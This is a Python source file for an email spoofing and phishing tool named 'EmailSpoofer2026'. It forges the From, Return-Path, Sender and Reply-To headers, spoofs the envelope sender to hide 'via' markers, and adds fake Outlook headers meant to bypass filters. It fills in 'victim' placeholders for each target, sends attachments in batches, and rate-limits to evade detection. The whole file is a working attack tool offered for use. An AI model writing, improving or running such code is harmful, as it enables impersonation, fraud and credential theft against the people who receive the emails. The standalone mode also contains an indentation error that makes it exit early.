#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Enhanced Email Spoofing Module 2026
Supports batch processing, placeholders, attachments, and advanced header manipulation
Can run standalone or be called from Node.js
"""
import os
import sys
import json
import csv
import time
import argparse
import smtplib
import io

# Fix Windows console encoding issues
if sys.platform == 'win32':
    # Set UTF-8 encoding for stdout/stderr on Windows
    if sys.stdout.encoding != 'utf-8':
        sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
    if sys.stderr.encoding != 'utf-8':
        sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8', errors='replace')

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.mime.image import MIMEImage
from email import encoders
from email.utils import formataddr, make_msgid, formatdate, parseaddr
from email.header import Header
from config import get_smtp_connection
import re
from pathlib import Path

# Safe print function for Windows console compatibility
def safe_print(*args, **kwargs):
    """Print function that handles Unicode encoding issues on Windows"""
    try:
        print(*args, **kwargs)
    except UnicodeEncodeError:
        # Fallback: encode to ASCII, replacing problematic characters
        safe_args = []
        for arg in args:
            if isinstance(arg, str):
                safe_args.append(arg.encode('ascii', 'replace').decode('ascii'))
            else:
                safe_args.append(str(arg).encode('ascii', 'replace').decode('ascii'))
        print(*safe_args, **kwargs)

class EmailSpoofer2026:
    def __init__(self, smtp_config):
        """Initialize with SMTP configuration"""
        self.smtp_host = smtp_config.get('host')
        self.smtp_port = smtp_config.get('port', 587)
        self.smtp_user = smtp_config.get('auth', {}).get('user')
        self.smtp_pass = smtp_config.get('auth', {}).get('pass')
        self.server = None
        
    def connect(self):
        """Establish SMTP connection"""
        try:
            self.server = get_smtp_connection(
                self.smtp_host, 
                self.smtp_port, 
                self.smtp_user, 
                self.smtp_pass
            )
            return True
        except Exception as e:
            error_msg = str(e).encode('ascii', 'replace').decode('ascii')
            print(f"Connection Error: {error_msg}", file=sys.stderr)
            return False
    
    def replace_placeholders(self, content, recipient, custom_data=None):
        """Replace placeholders in content (compatible with Node.js placeholders)"""
        if not isinstance(content, str):
            return content
            
        if not recipient:
            return content
            
        domain = recipient.split('@')[1] if '@' in recipient else 'defaultdomain.com'
        name = recipient.split('@')[0] if '@' in recipient else 'defaultname'
        domain_parts = domain.split('.')
        
        # Basic placeholders
        replacements = {
            '##victimemail##': recipient,
            '##victimname##': name.capitalize(),
            '##victimdomain##': domain,
            '##victimdomain1##': domain_parts[0].capitalize() if domain_parts else 'Default',
            '##victimdomain2##': domain_parts[0].upper() if domain_parts else 'DEFAULT',
            '##victimdomain3##': f"{domain_parts[0].capitalize()}.{domain_parts[1].upper()}" if len(domain_parts) > 1 else 'Default.COM',
            '##victimdomain4##': domain_parts[0].lower() if domain_parts else 'default',
            '##victimb64email##': recipient.encode('utf-8').hex(),  # Simplified base64 alternative
        }
        
        # Custom data placeholders
        if custom_data:
            for key, value in custom_data.items():
                replacements[f'##{key}##'] = str(value)
        
        # Replace placeholders
        for placeholder, value in replacements.items():
            content = content.replace(placeholder, value)
        
        return content
    
    def create_message(self, recipient, spoof_config, html_content, attachments=None, cid_images=None):
        """Create MIME message with spoofed headers - ADVANCED MODE with perfect alignment"""
        msg = MIMEMultipart("alternative")
        
        # Spoofed From address
        spoofed_email = self.replace_placeholders(spoof_config.get('fromEmail', ''), recipient)
        spoofed_name = self.replace_placeholders(spoof_config.get('fromName', ''), recipient)
        
        # CRITICAL: Get domain for Message-ID (must match spoofed domain)
        domain = spoofed_email.split('@')[-1] if '@' in spoofed_email else 'example.com'
        
        # Set headers - PERFECT ALIGNMENT
        msg['Subject'] = self.replace_placeholders(spoof_config.get('subject', ''), recipient)
        msg['From'] = formataddr((spoofed_name, spoofed_email))
        msg['To'] = recipient
        msg['Date'] = formatdate(localtime=True)
        
        # CRITICAL: Message-ID with spoofed domain (looks authentic)
        msg['Message-ID'] = make_msgid(domain=domain)
        
        # CRITICAL: Return-Path MUST match From (defaults to From if not set)
        return_path = spoof_config.get('returnPath') or spoofed_email
        if return_path:
            msg['Return-Path'] = self.replace_placeholders(return_path, recipient)
        else:
            msg['Return-Path'] = spoofed_email
        
        # CRITICAL: Sender MUST match From (removes "via" display)
        sender = spoof_config.get('sender') or spoofed_email
        if sender:
            msg['Sender'] = self.replace_placeholders(sender, recipient)
        else:
            msg['Sender'] = spoofed_email
        
        # CRITICAL: Reply-To MUST match From
        custom_headers = spoof_config.get('customHeaders', {})
        reply_to = custom_headers.get('Reply-To') or spoofed_email
        msg['Reply-To'] = self.replace_placeholders(reply_to, recipient) if reply_to else spoofed_email
        
        # NEW: Handle CC header - extract and set CC recipients
        cc_recipients = []
        cc_header = custom_headers.get('Cc') or custom_headers.get('cc')
        if cc_header:
            # Parse comma-separated CC emails
            cc_emails = [email.strip() for email in str(cc_header).split(',') if email.strip()]
            if cc_emails:
                # Replace placeholders in each CC email
                processed_cc = [self.replace_placeholders(email, recipient) for email in cc_emails]
                cc_recipients = processed_cc
                # Set CC header in message
                msg['Cc'] = ', '.join(processed_cc)
        
        # Professional headers to bypass filters
        msg['X-Mailer'] = 'Microsoft Outlook 16.0'
        msg['X-Priority'] = str(spoof_config.get('priority', '1'))
        msg['X-MSMail-Priority'] = 'High'
        msg['Importance'] = 'High'
        
        # Advanced headers for authentication alignment
        msg['X-Originating-Email'] = spoofed_email
        msg['X-Original-Sender'] = spoofed_email
        msg['X-Sender'] = spoofed_email
        
        # Optional custom headers (but skip ones we've already set)
        skip_headers = ['Reply-To', 'Return-Path', 'Sender', 'X-Originating-Email', 'X-Original-Sender', 'X-Sender', 'Cc', 'cc']
        for header_name, header_value in custom_headers.items():
            if header_value and header_name not in skip_headers:
                # Skip empty values (used to remove headers)
                if header_value == "":
                    continue
                msg[header_name] = str(header_value)
        
        # Store CC recipients in message for use in send_email
        msg._cc_recipients = cc_recipients
        
        # HTML content
        processed_html = self.replace_placeholders(html_content, recipient)
        msg.attach(MIMEText(processed_html, "html"))
        
        # Attachments
        if attachments:
            for att_path in attachments:
                if os.path.exists(att_path):
                    with open(att_path, "rb") as f:
                        part = MIMEBase('application', 'octet-stream')
                        part.set_payload(f.read())
                        encoders.encode_base64(part)
                        part.add_header('Content-Disposition', f'attachment; filename= {os.path.basename(att_path)}')
                        msg.attach(part)
        
        # CID images (inline images)
        if cid_images:
            for cid, img_path in cid_images.items():
                if os.path.exists(img_path):
                    with open(img_path, "rb") as f:
                        img = MIMEImage(f.read())
                        img.add_header('Content-ID', f'<{cid}>')
                        img.add_header('Content-Disposition', 'inline')
                        msg.attach(img)
        
        return msg
    
    def send_email(self, recipient, spoof_config, html_content, attachments=None, cid_images=None, delay=0):
        """Send spoofed email with envelope manipulation - ADVANCED MODE with CC support"""
        if not self.server:
            if not self.connect():
                return False
        
        try:
            msg = self.create_message(recipient, spoof_config, html_content, attachments, cid_images)
            
            # CRITICAL: Get spoofed email for envelope sender
            spoofed_email = self.replace_placeholders(spoof_config.get('fromEmail', ''), recipient)
            
            # NEW: Build recipient list including CC recipients
            all_recipients = [recipient]
            if hasattr(msg, '_cc_recipients') and msg._cc_recipients:
                all_recipients.extend(msg._cc_recipients)
            
            # ADVANCED: Try envelope spoofing first (MAIL FROM = From header)
            # This removes "via" display and improves authentication
            use_envelope_spoofing = spoof_config.get('useEnvelopeSpoofing', True)
            
            if use_envelope_spoofing:
                try:
                    # Attempt to use spoofed email as envelope sender
                    # This is what removes "via rentitsimplyglobal.com"
                    # Include all recipients (To + CC) in SMTP RCPT TO
                    self.server.sendmail(spoofed_email, all_recipients, msg.as_string())
                except smtplib.SMTPException as e:
                    # If envelope spoofing fails, fallback to authenticated user
                    # Some SMTP servers require envelope to match auth user
                    error_code = getattr(e, 'smtp_code', 'Unknown')
                    if error_code in ['550', '553', '501']:  # Server rejected envelope
                        # Fallback: Use authenticated user but keep headers spoofed
                        # Include all recipients (To + CC) in SMTP RCPT TO
                        self.server.sendmail(self.smtp_user, all_recipients, msg.as_string())
                    else:
                        raise
            else:
                # Standard mode: Use authenticated user for envelope
                # Include all recipients (To + CC) in SMTP RCPT TO
                self.server.sendmail(self.smtp_user, all_recipients, msg.as_string())
            
            if delay > 0:
                time.sleep(delay)
            
            return True
        except smtplib.SMTPRecipientsRefused as e:
            # All recipients were refused
            error_msg = f"SMTP Recipients Refused: {e.recipients}"
            # Ensure ASCII-safe encoding
            error_msg = error_msg.encode('ascii', 'replace').decode('ascii')
            error_result = {
                'error': error_msg,
                'recipient': recipient,
                'success': 0,
                'total': 1
            }
            print(json.dumps(error_result), file=sys.stderr, flush=True)
            return False
        except smtplib.SMTPDataError as e:
            # SMTP data error (e.g., message rejected)
            error_code = getattr(e, 'smtp_code', 'Unknown')
            error_msg = f"SMTP {error_code}: Message rejected - {str(e)}"
            # Ensure ASCII-safe encoding
            error_msg = error_msg.encode('ascii', 'replace').decode('ascii')
            error_result = {
                'error': error_msg,
                'recipient': recipient,
                'success': 0,
                'total': 1
            }
            print(json.dumps(error_result), file=sys.stderr, flush=True)
            return False
        except smtplib.SMTPException as e:
            # General SMTP exception
            error_code = getattr(e, 'smtp_code', 'Unknown')
            error_msg = f"SMTP {error_code}: {str(e)}"
            # Ensure ASCII-safe encoding
            error_msg = error_msg.encode('ascii', 'replace').decode('ascii')
            error_result = {
                'error': error_msg,
                'recipient': recipient,
                'success': 0,
                'total': 1
            }
            print(json.dumps(error_result), file=sys.stderr, flush=True)
            return False
        except Exception as e:
            # Other exceptions
            error_msg = f"Error: {str(e)}"
            # Ensure ASCII-safe encoding
            error_msg = error_msg.encode('ascii', 'replace').decode('ascii')
            error_result = {
                'error': error_msg,
                'recipient': recipient,
                'success': 0,
                'total': 1
            }
            print(json.dumps(error_result), file=sys.stderr, flush=True)
            return False
    
    def send_batch(self, recipients, spoof_config, html_content, attachments=None, cid_images=None, rate_limit=None):
        """Send emails to multiple recipients with rate limiting"""
        success_count = 0
        total = len(recipients)
        
        delay = 0
        if rate_limit and rate_limit.get('enabled'):
            emails_per_hour = rate_limit.get('emailsPerHour', 10)
            delay = (60 * 60) / emails_per_hour  # seconds between emails
        
        for i, recipient in enumerate(recipients, 1):
            if not recipient or not recipient.strip():
                continue
                
            recipient = recipient.strip()
            safe_print(f"[{i}/{total}] Sending to {recipient}...", flush=True)
            
            result = self.send_email(recipient, spoof_config, html_content, attachments, cid_images, delay)
            if result:
                success_count += 1
                # Use ASCII-safe characters for Windows compatibility
                safe_print(f"[OK] Success: {recipient}", flush=True)
            else:
                # Error already printed in send_email via stderr
                pass
        
        return success_count, total
    
    def close(self):
        """Close SMTP connection"""
        if self.server:
            try:
                self.server.quit()
            except:
                pass

def load_config_from_json(json_file):
    """Load configuration from JSON file (from Node.js)"""
    with open(json_file, 'r', encoding='utf-8') as f:
        return json.load(f)

def main():
    """Main entry point - can be called standalone or from Node.js"""
    parser = argparse.ArgumentParser(description='Email Spoofer 2026')
    parser.add_argument('--config', type=str, help='JSON config file from Node.js')
    parser.add_argument('--standalone', action='store_true', help='Run in standalone mode')
    
    args = parser.parse_args()
    
    if args.config:
        # Called from Node.js
        try:
            # Check if config file exists
            if not os.path.exists(args.config):
                error_result = {'error': f'Config file not found: {args.config}', 'success': 0, 'total': 0}
                print(json.dumps(error_result), flush=True)
                sys.exit(1)
            
            config = load_config_from_json(args.config)
            
            # Validate required fields
            if 'smtpConfig' not in config:
                error_result = {'error': 'Missing smtpConfig in JSON', 'success': 0, 'total': 0}
                print(json.dumps(error_result), flush=True)
                sys.exit(1)
            
            spoofer = EmailSpoofer2026(config['smtpConfig'])
            
            # Load HTML template
            html_path = config.get('htmlTemplate', 'email.html')
            if not os.path.exists(html_path):
                # Try relative paths
                script_dir = os.path.dirname(os.path.abspath(__file__))
                parent_dir = os.path.dirname(script_dir)
                fallback_path = os.path.join(parent_dir, 'letter.html')
                if os.path.exists(fallback_path):
                    html_path = fallback_path
                elif os.path.exists('../letter.html'):
                    html_path = '../letter.html'
                else:
                    error_result = {'error': f'HTML template not found: {html_path}', 'success': 0, 'total': 0}
                    print(json.dumps(error_result), flush=True)
                    sys.exit(1)
            
            with open(html_path, 'r', encoding='utf-8') as f:
                html_content = f.read()
            
            # Get recipients
            recipients = config.get('recipients', [])
            if not recipients:
                error_result = {'error': 'No recipients specified', 'success': 0, 'total': 0}
                print(json.dumps(error_result), flush=True)
                sys.exit(1)
            
            # Spoofing configuration
            spoof_config = config.get('spoofConfig', {})
            
            # Attachments and CID images
            attachments = config.get('attachments', [])
            cid_images = config.get('cidImages', {})
            
            # Rate limiting
            rate_limit = config.get('rateLimit', {})
            
            # Send batch
            success, total = spoofer.send_batch(
                recipients, 
                spoof_config, 
                html_content, 
                attachments, 
                cid_images,
                rate_limit
            )
            
            spoofer.close()
            
            # Return result as JSON
            result = {
                'success': success,
                'total': total,
                'failed': total - success
            }
            # Ensure JSON output is properly flushed
            json_output = json.dumps(result)
            print(json_output, flush=True)
            sys.stdout.flush()
            
        except FileNotFoundError as e:
            error_result = {'error': f'File not found: {str(e)}', 'success': 0, 'total': 0}
            print(json.dumps(error_result), flush=True)
            sys.exit(1)
        except json.JSONDecodeError as e:
            error_result = {'error': f'Invalid JSON in config: {str(e)}', 'success': 0, 'total': 0}
            print(json.dumps(error_result), flush=True)
            sys.exit(1)
        except Exception as e:
            import traceback
            error_msg = f'{type(e).__name__}: {str(e)}'
            error_result = {'error': error_msg, 'success': 0, 'total': 0}
            print(json.dumps(error_result), flush=True)
            sys.exit(1)
    
    elif args.standalone:
        # Standalone interactive mode
        print("=== Email Spoofer 2026 - Standalone Mode ===")
        
        smtp_host = input("SMTP Server: ").strip()
        smtp_port = int(input("Port (465/587): ").strip() or "587")
        smtp_user = input("SMTP Username: ").strip()
        smtp_pass = input("SMTP Password: ").strip()
        
        from_name = input("Display Name: ").strip()
        spoofed_email = input("Spoofed Email: ").strip()
        subject = input("Subject: ").strip()
        
        # Load template
        html_path = input("HTML Template Path (email.html): ").strip() or "email.html"
        if not os.path.exists(html_path):
            print(f"Error: {html_path} not found.")
        return

        with open(html_path, 'r', encoding='utf-8') as f:
            html_content = f.read()
        
        # Get recipients
        recipients_input = input("Recipients (comma-separated or 'file:targets.csv'): ").strip()
        if recipients_input.startswith('file:'):
            csv_path = recipients_input[5:]
            recipients = []
            with open(csv_path, 'r') as f:
                reader = csv.reader(f)
                for row in reader:
                    if row:
                        recipients.append(row[0].strip())
        else:
            recipients = [r.strip() for r in recipients_input.split(',')]
        
        # Create spoofer
        smtp_config = {
            'host': smtp_host,
            'port': smtp_port,
            'auth': {'user': smtp_user, 'pass': smtp_pass}
        }
        
        spoofer = EmailSpoofer2026(smtp_config)
        
        spoof_config = {
            'fromEmail': spoofed_email,
            'fromName': from_name,
            'subject': subject,
            'priority': '1'
        }
        
        success, total = spoofer.send_batch(recipients, spoof_config, html_content)
        spoofer.close()
        
        print(f"\n=== Results ===")
        print(f"Success: {success}/{total}")
    
    else:
        parser.print_help()

if __name__ == "__main__":
    main()
